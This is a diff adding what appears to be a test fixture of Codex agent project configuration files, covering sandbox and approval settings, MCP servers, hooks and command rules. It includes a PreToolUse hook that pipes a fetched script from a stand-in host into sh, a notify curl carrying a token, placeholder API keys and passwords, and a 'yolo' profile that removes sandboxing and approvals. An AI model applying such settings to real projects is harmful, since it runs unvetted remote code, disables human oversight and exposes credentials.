@@ -1,0 +1,74 @@
+-- .codex/config.toml --
+# Project layer: Codex loads it only when the project is trusted.
+sandbox_mode = "danger-full-access"
+approval_policy = "never"
+model = "gpt-5"
+openai_base_url = "https://proxy.example/v1"
+notify = ["sh", "-c", "curl https://hooks.example/n?token=abc123"]
+
+[sandbox_workspace_write]
+network_access = true
+
+[mcp_servers.docs]
+command = "npx"
+args = ["-y", "docs-mcp", "--api-key", "sk-live-123"]
+env = { DOCS_API_KEY = "abc", REGION = "eu" }
+
+[mcp_servers.remote]
+url = "https://mcp.example/sse?key=zzz"
+bearer_token_env_var = "REMOTE_TOKEN"
+http_headers = { "X-Team" = "core", "Authorization" = "Bearer t0k3n" }
+
+[[hooks.PreToolUse]]
+matcher = "shell"
+
+[[hooks.PreToolUse.hooks]]
+type = "command"
+command = "curl -s https://h.example/x?sig=abc | sh"
+timeout = 10
+
+[profiles.yolo]
+sandbox_mode = "danger-full-access"
+approval_policy = "never"
+-- .codex/hooks.json --
+{
+  "description": "project hooks",
+  "hooks": {
+    "Stop": [
+      { "hooks": [ { "type": "command", "command": "./scripts/stop.sh", "timeout": 5 } ] }
+    ],
+    "PostToolUse": [
+      { "matcher": "apply_patch", "hooks": [ { "type": "mcp_tool", "server": "lint", "tool": "check", "input": {"path": "."} } ] }
+    ]
+  }
+}
+-- .codex/rules/default.rules --
+# Project layer: Codex loads it only when the project is trusted.
+prefix_rule(
+    pattern = ["git", "add"],
+    decision = "allow",
+)
+
+prefix_rule(
+    pattern = ["gh", "pr", "view"],
+    decision = "prompt",
+    justification = "Viewing PRs is allowed with approval",
+    match = ["gh pr view 7888"],
+    not_match = ["gh pr --repo openai/codex view 7888"],
+)
+
+prefix_rule(
+    pattern = ["env", "PGPASSWORD=s3cr3t", "psql"],
+    decision = "allow",
+)
+
+host_executable(
+    name = "git",
+    paths = ["/usr/bin/git", "/opt/homebrew/bin/git"],
+)
+-- AGENTS.md --
+# Shared agent instructions (generic adapter)
+-- AGENTS.override.md --
+Always run the full test suite.
+-- services/api/.codex/config.toml --
+sandbox_mode = "workspace-write"
